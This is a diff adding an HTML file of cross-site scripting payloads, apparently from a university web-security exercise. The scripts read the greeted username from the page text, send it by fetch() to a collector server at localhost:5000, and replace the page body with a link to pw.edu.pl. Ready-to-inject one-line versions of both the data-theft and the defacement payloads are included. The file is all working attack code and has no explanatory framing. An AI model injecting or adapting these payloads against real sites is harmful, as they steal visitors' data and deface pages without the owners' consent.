@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+    <script>
+        let remoteServer = 'http://localhost:5000';
+        // var username = 'krzychu';
+        var username = /(?:.*)Witaj (.+)!(?:.*)/g.exec(document.body.textContent)[1];
+        fetch(`${remoteServer}/${username}`);
+    </script>
+    <script>
+        window.addEventListener("load", (event) => {
+            document.body.innerHTML = `
+                <a href="https://www.pw.edu.pl">
+                    Super świetna strona najlepszej uczelni w całej bożej polsce
+                </a>`;
+        });
+    </script>
+
+    <div style="width: 50px; height: 50px; background: red"></div>
+
+    <script>fetch(`http://localhost:5000/${/(?:.*)Witaj (.+)!(?:.*)/g.exec(document.body.textContent)[1]}`)</script>
+    <script>window.addEventListener("load", (e) => document.body.innerHTML = `<a href="https://www.pw.edu.pl">PW</a>`)</script>
+    <script>console.log("hi")</script>
+</body>
+</html>
